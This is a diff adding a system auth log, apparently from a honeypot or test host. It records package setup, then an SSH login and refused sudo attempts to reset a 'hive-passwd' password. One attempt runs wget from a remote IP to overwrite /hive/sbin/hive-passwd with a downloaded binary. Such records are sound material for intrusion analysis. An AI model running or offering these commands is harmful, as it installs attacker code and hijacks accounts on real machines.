@@ -1,0 +1,42 @@
+Nov  9 10:27:19 banner-session-42868 systemd-logind[164]: New seat seat0.
+Nov  9 10:27:22 banner-session-42868 sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt-get update
+Nov  9 10:27:22 banner-session-42868 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
+Nov  9 10:27:31 banner-session-42868 sudo: pam_unix(sudo:session): session closed for user root
+Nov  9 10:27:31 banner-session-42868 sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt-get install openssh-server -y
+Nov  9 10:27:31 banner-session-42868 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
+Nov  9 10:27:46 banner-session-42868 useradd[748]: new user: name=sshd, UID=106, GID=65534, home=/run/sshd, shell=/usr/sbin/nologin, from=none
+Nov  9 10:27:46 banner-session-42868 usermod[756]: change user 'sshd' password
+Nov  9 10:27:46 banner-session-42868 chage[763]: changed password expiry for sshd
+Nov  9 10:27:49 banner-session-42868 sshd[1198]: Server listening on 0.0.0.0 port 22.
+Nov  9 10:27:49 banner-session-42868 sshd[1198]: Server listening on :: port 22.
+Nov  9 10:27:50 banner-session-42868 sudo: pam_unix(sudo:session): session closed for user root
+Nov  9 10:27:50 banner-session-42868 sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt-get install -y curl
+Nov  9 10:27:50 banner-session-42868 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
+Nov  9 10:28:01 banner-session-42868 sudo: pam_unix(sudo:session): session closed for user root
+Nov  9 10:36:15 banner-session-42868 useradd[1546]: new group: name=user, GID=1001
+Nov  9 10:36:15 banner-session-42868 useradd[1546]: new user: name=user, UID=1001, GID=1001, home=/home/user, shell=/bin/bash, from=none
+Nov  9 10:36:15 banner-session-42868 usermod[1555]: change user 'user' password
+Nov  9 10:36:15 banner-session-42868 sshd[1562]: Accepted password for user from 10.0.3.1 port 39924 ssh2
+Nov  9 10:36:15 banner-session-42868 sshd[1562]: pam_unix(sshd:session): session opened for user user by (uid=0)
+Nov  9 10:36:15 banner-session-42868 systemd-logind[164]: New session 3898 of user user.
+Nov  9 10:36:15 banner-session-42868 systemd: pam_unix(systemd-user:session): session opened for user user by (uid=0)
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): conversation failed
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): auth could not identify password for [user]
+Nov  9 10:36:16 banner-session-42868 sudo:     user : user NOT in sudoers ; TTY=unknown ; PWD=/home/user ; USER=root ; COMMAND=hive-passwd set ifjeeisurofmioufiose
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): conversation failed
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): auth could not identify password for [user]
+Nov  9 10:36:16 banner-session-42868 sudo:     user : user NOT in sudoers ; TTY=unknown ; PWD=/home/user ; USER=root ; COMMAND=hive-passwd ifjeeisurofmioufiose
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): conversation failed
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): auth could not identify password for [user]
+Nov  9 10:36:16 banner-session-42868 sudo:     user : user NOT in sudoers ; TTY=unknown ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/wget http://185.196.9.109/qwe/hive-passwd -O /hive/sbin/hive-passwd
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): conversation failed
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): auth could not identify password for [user]
+Nov  9 10:36:16 banner-session-42868 sudo:     user : user NOT in sudoers ; TTY=unknown ; PWD=/home/user ; USER=root ; COMMAND=dos2unix /hive/sbin/hive-passwd
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): conversation failed
+Nov  9 10:36:16 banner-session-42868 sudo: pam_unix(sudo:auth): auth could not identify password for [user]
+Nov  9 10:36:16 banner-session-42868 sudo:     user : user NOT in sudoers ; TTY=unknown ; PWD=/home/user ; USER=root ; COMMAND=hive-passwd set ifjeeisurofmioufiose
+Nov  9 10:36:16 banner-session-42868 sshd[1579]: Received disconnect from 10.0.3.1 port 39924:11: 
+Nov  9 10:36:16 banner-session-42868 sshd[1579]: Disconnected from user user 10.0.3.1 port 39924
+Nov  9 10:36:16 banner-session-42868 sshd[1562]: pam_unix(sshd:session): session closed for user user
+Nov  9 10:36:16 banner-session-42868 systemd-logind[164]: Session 3898 logged out. Waiting for processes to exit.
+Nov  9 10:36:16 banner-session-42868 systemd-logind[164]: Removed session 3898.
